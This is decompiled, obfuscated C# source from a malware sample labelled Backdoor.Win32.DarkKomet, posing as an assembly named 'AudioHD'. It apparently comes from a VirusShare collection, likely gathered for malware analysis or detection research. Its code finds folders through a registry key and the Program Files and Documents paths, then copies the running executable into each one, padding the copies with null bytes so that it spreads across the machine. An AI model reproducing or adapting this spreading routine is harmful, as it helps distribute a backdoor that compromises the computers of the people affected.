// Decompiled with JetBrains decompiler
// Type:  
// Assembly: AudioHD, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C44212F0-6FD7-4886-BEB4-F43F84F3B277
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.DarkKomet.hzfh-26a1c6d83f8e03a282b89acec8aef19eabb2f72745381a243a94811e2d7d3cb6.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;

internal sealed class \u000E\u2000
{
  private static string \u0002 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);

  public static void \u0002(string _param0)
  {
    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\u0006\u2002.\u0002(-885878732), false);
    if (registryKey == null)
      return;
    \u000E\u2000.\u0002(registryKey.GetValue(\u0006\u2002.\u0002(-885878775)).ToString() + \u0006\u2002.\u0002(-885875661), _param0);
  }

  public static void \u0003(string _param0)
  {
    string str1 = Environment.GetFolderPath(Environment.SpecialFolder.Personal).Replace(\u0006\u2002.\u0002(-885878668), \u0006\u2002.\u0002(-885878684));
    string str2 = \u000E\u2000.\u0002 + \u0006\u2002.\u0002(-885878716);
    \u000E\u2000.\u0002(str1, _param0);
    \u000E\u2000.\u0002(str2, _param0);
  }

  public static void \u0005(string _param0)
  {
    string str1 = \u000E\u2000.\u0002 + \u0006\u2002.\u0002(-885878611);
    string str2 = \u000E\u2000.\u0002 + \u0006\u2002.\u0002(-885878638);
    string str3 = \u000E\u2000.\u0002 + \u0006\u2002.\u0002(-885878546);
    \u000E\u2000.\u0002(str1, _param0);
    \u000E\u2000.\u0002(str2, _param0);
    \u000E\u2000.\u0002(str3, _param0);
  }

  public static void \u0008(string _param0) => \u000E\u2000.\u0002(\u000E\u2000.\u0002 + \u0006\u2002.\u0002(-885878586), _param0);

  public static void \u0006(string _param0) => \u000E\u2000.\u0002(\u000E\u2000.\u0002 + \u0006\u2002.\u0002(-885877976), _param0);

  public static void \u000E(string _param0) => \u000E\u2000.\u0002(\u000E\u2000.\u0002 + \u0006\u2002.\u0002(-885878001), _param0);

  public static void \u000F(string _param0) => \u000E\u2000.\u0002(\u000E\u2000.\u0002 + \u0006\u2002.\u0002(-885877898), _param0);

  public static void \u0002\u2000(string _param0) => \u000E\u2000.\u0002(\u000E\u2000.\u0002 + \u0006\u2002.\u0002(-885877931), _param0);

  public static void \u0003\u2000(string _param0) => \u000E\u2000.\u0002(\u000E\u2000.\u0002 + \u0006\u2002.\u0002(-885877833), _param0);

  public static void \u0005\u2000(string _param0) => \u000E\u2000.\u0002(\u000E\u2000.\u0002 + \u0006\u2002.\u0002(-885877857), _param0);

  public static void \u0008\u2000(string _param0) => \u000E\u2000.\u0002(\u000E\u2000.\u0002 + \u0006\u2002.\u0002(-885877877), _param0);

  public static void \u0002(string _param0, string _param1)
  {
    if (!Directory.Exists(_param0))
      return;
    if (File.Exists(_param0 + _param1))
      return;
    try
    {
      File.Copy(Process.GetCurrentProcess().MainModule.FileName, _param0 + _param1, true);
      FileStream fileStream = File.OpenWrite(_param0 + _param1);
      long num1 = fileStream.Seek(0L, SeekOrigin.End);
      Decimal num2 = (Decimal) (Convert.ToInt32(_param1.Length) * 10485);
      while ((Decimal) num1 < num2)
      {
        ++num1;
        fileStream.WriteByte((byte) 0);
      }
      fileStream.Close();
    }
    catch
    {
    }
  }
}
